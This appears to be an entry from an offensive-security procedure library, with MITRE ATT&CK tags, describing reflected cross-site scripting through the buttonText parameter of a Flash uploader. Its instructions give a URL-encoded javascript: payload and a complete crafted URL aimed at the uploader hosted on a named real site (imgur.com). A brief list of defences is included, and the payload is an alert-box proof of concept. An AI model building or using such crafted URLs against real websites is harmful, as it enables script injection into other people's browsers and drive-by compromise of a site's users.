---
tags:
  - xss
  - injection
  - flash
  - payload
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Flash (SWF)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:47:18.437Z'
skill_level: advanced
impact_level: medium
detection_risk: medium
sub_techniques: []
id: ce7af581-7c93-42a2-aaee-fd1ff0796900
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Inject HTML JavaScript into buttonText Parameter

## Summary

This procedure crafts a malicious URL for embedding a Flash SWF with unsanitized HTML containing JavaScript in the buttonText parameter, setting up reflected XSS without triggering the SWF's default event handlers.

## Description

The swfupload.swf file renders buttonText as HTML on the upload button, allowing insertion of links or elements with javascript: URIs. Additional parameters style and configure the button to make the payload visible and clickable. This step prepares the payload but requires bypass for execution due to SWF event overriding.

## Requirements

1. URL encoder tool or manual encoding knowledge
2. Target SWF URL
3. Basic HTML/JS payload (e.g., alert(document.domain))

## Defense

Defensive measures and detection strategies:

- Validate and escape all SWF parameters
- Disable Flash or use alternatives
- Monitor for anomalous SWF parameter lengths

## Objectives

1. Encode and inject HTML/JS payload into buttonText
2. Configure supporting parameters for visibility
3. Verify static rendering of injected content

## Instructions

### Step 1: Craft the Payload

**Context**: Create HTML with JS link for injection.

Use: <a href="javascript:alert(document.domain)">CLICKME</a> and URL-encode to %3Ca%20href%3D%22javascript:alert(document.domain)%22%3ECLICKME%3C/a%3E.

**Expected Output**: Encoded string ready for URL.

### Step 2: Build Full SWF URL

**Context**: Append parameters to SWF base URL.

Construct: https://imgur.com/include/flash/swfupload.swf?buttonText=[encoded]&buttonTextStyle=a{color:%23ff00ff}&buttonDisabled=&buttonImageURL=/&buttonAction=-120&buttonCursor=-2.

**Expected Output**: Complete injectable URL.

### Step 3: Test Static Load

**Context**: Load URL directly to confirm HTML renders.

Open the URL in browser; observe pink 'CLICKME' text on button, but click may not execute due to override.

**Expected Output**: Visible injected HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[injection]]
